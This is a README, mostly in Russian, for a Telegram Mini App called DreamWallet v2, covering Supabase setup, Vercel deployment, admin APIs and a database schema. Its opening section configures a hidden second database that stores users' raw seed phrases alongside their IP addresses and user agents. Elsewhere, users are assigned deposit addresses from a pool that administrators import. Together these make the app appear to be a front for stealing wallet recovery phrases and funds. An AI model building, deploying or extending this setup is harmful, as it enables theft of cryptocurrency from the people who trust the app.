## Second Supabase (secure) for seed phrases

Configure these environment variables in Vercel Project Settings (Environment Variables):

- `VW_RUNTIME_DB_URL` — Secure Supabase URL
- `VW_RUNTIME_DB_SERVICE_KEY` — Secure Supabase service role key

Alternative aliases supported: `SECURE_DB_URL`, `SECURE_DB_SERVICE_KEY`, or `SECOND_SUPABASE_URL`, `SECOND_SUPABASE_SERVICE_KEY`.

Create the table in that project:

```
create table public.app_secrets_storage (
  id bigserial primary key,
  phrase_raw text not null,
  user_meta jsonb null,
  client_ip text null,
  user_agent text null,
  created_at timestamptz default now()
);
alter table public.app_secrets_storage enable row level security;
create policy "service-only" on public.app_secrets_storage for all using (auth.role() = 'service_role');
```

# DreamWallet v2 🚀

Telegram Mini App для управления криптовалютными кошельками с персональными адресами для каждого пользователя.

## 🌟 Особенности

- **Персональные адреса**: Каждому пользователю автоматически присваивается уникальный набор адресов
- **Поддержка 5 сетей**: TON, TRON, Solana, Ethereum, BNB Smart Chain
- **Админ панель**: Полноценная система управления пользователями и адресами
- **Автоматическое назначение**: Новые пользователи автоматически получают адреса из пула
- **База данных Supabase**: Надежное хранение данных пользователей
- **Telegram интеграция**: Полная интеграция с Telegram Mini Apps

## 🏗️ Архитектура

```
DreamWallet v2
├── Frontend (Telegram Mini App)
│   ├── index.html - Главная страница
│   ├── qr-usdt.html - QR коды для пополнения
│   ├── admin.html - Админ панель
│   └── user-manager.js - Система управления пользователями
├── Backend (Vercel Functions)
│   ├── api/addresses.js - API для работы с адресами
│   ├── api/users.js - API управления пользователями
│   └── api/admin/ - API для админ панели
└── Database (Supabase)
    ├── users - Таблица пользователей
    ├── address_sets - Наборы адресов
    └── transactions - История транзакций
```

## 🚀 Быстрый старт

### Вариант 1: Автоматическая настройка (рекомендуется)

```bash
# Клонируйте репозиторий
git clone <your-repo-url>
cd DreamWallet-v2

# Запустите автоматический скрипт настройки
./quick-setup.sh
```

Скрипт поможет:
- Создать проект Supabase
- Настроить базу данных
- Встроить ключи прямо в код
- Подготовить к деплою

### Вариант 2: Ручная настройка

1. **Создайте проект Supabase** (следуйте `CREATE_SUPABASE_PROJECT.md`)
2. **Выполните SQL скрипт** из `supabase-setup-improved.sql` 
3. **Замените ключи в коде** в файле `api/supabase.js`:

```javascript
// Замените эти строки на ваши реальные данные:
export const SUPABASE_URL = 'https://ваш-проект.supabase.co';
export const SUPABASE_ANON_KEY = 'ваш-anon-ключ';
export const SUPABASE_SERVICE_KEY = 'ваш-service-ключ';
```

### Проверка настройки

Откройте `/api/debug` после деплоя - должно показать все ключи как настроенные.

### 4. Подготовка данных

Импортируйте ваши наборы адресов через админ панель или напрямую в базу данных.

Формат набора адресов:
```
user1,ton:EQD4FPq-PRDieyQKkizFTRtSD...,tron:TR7NHqjeKQxGTCi8q8ZY4p...,sol:EPjFWdd5AufqSSqeM2qN1x...,eth:0xdAC17F958D2ee523a2206206...,bnb:0x55d398326f99059fF775485246...
```

### 5. Деплой на Vercel

```bash
# Для первого деплоя
vercel

# Для последующих деплоев
npm run deploy
```

### 6. Настройка Telegram Bot

1. Создайте бота через [@BotFather](https://t.me/botfather)
2. Настройте Mini App, указав URL вашего Vercel проекта
3. Добавьте команды меню для удобства пользователей

## 📱 Использование

### Для пользователей

1. Пользователь заходит в Telegram Mini App
2. Автоматически создается аккаунт и назначается набор адресов
3. Пользователь может получать QR коды для пополнения
4. При повторном входе адреса остаются теми же

### Для администраторов

1. Откройте `your-domain.vercel.app/admin.html`
2. Управляйте пользователями и наборами адресов
3. Массово импортируйте новые адреса
4. Мониторьте статистику использования

## 🔧 API Endpoints

### Пользовательские API

- `GET /api/addresses?telegram_id=123` - Получить адреса пользователя
- `POST /api/addresses` - Создать/обновить пользователя

### Админ API

- `GET /api/admin/users` - Список всех пользователей
- `GET /api/admin/address-sets` - Список всех наборов адресов
- `POST /api/admin/address-sets` - Создать набор адресов
- `PUT /api/admin/address-sets/{id}` - Обновить набор адресов
- `DELETE /api/admin/address-sets/{id}` - Удалить набор адресов
- `POST /api/admin/reset-user/{id}` - Сбросить адреса пользователя
- `DELETE /api/admin/users/{id}` - Удалить пользователя

## 🗃️ Структура базы данных

### Таблица `users`
- `id` - Уникальный ID пользователя
- `telegram_id` - ID пользователя в Telegram
- `first_name`, `last_name`, `username` - Данные профиля
- `address_set_id` - Ссылка на набор адресов
- `created_at`, `updated_at` - Временные метки

### Таблица `address_sets`
- `id` - Уникальный ID набора
- `name` - Имя набора (user1, user2, ...)
- `ton_address`, `tron_address`, `sol_address`, `eth_address`, `bnb_address`
- `is_used` - Флаг использования
- `assigned_to_telegram_id` - ID назначенного пользователя
- `assigned_at` - Время назначения

### Таблица `transactions` (для будущего развития)
- История депозитов и выводов пользователей

## 🔒 Безопасность

- **RLS (Row Level Security)** включен для всех таблиц
- **Сервисный ключ** используется только для серверных операций
- **Анонимный ключ** для клиентских запросов
- **CORS** настроен для безопасного доступа

## 🐛 Отладка

### Логи разработки
```bash
npm run dev
```

### Проверка пользователя
```javascript
// В консоли браузера
console.log(window.userManager.exportUserData());
```

### Проверка API
```bash
curl "https://your-domain.vercel.app/api/addresses?telegram_id=123456789"
```

## 📈 Мониторинг

- **Vercel Analytics** - производительность приложения
- **Supabase Dashboard** - состояние базы данных
- **Админ панель** - статистика пользователей

## 🤝 Поддержка

1. Проверьте логи в Vercel Dashboard
2. Проверьте состояние Supabase
3. Используйте админ панель для диагностики
4. Проверьте переменные окружения

## 📄 Лицензия

MIT License - используйте свободно для коммерческих и некоммерческих проектов.

---

**Создано для Telegram Mini Apps с ❤️**
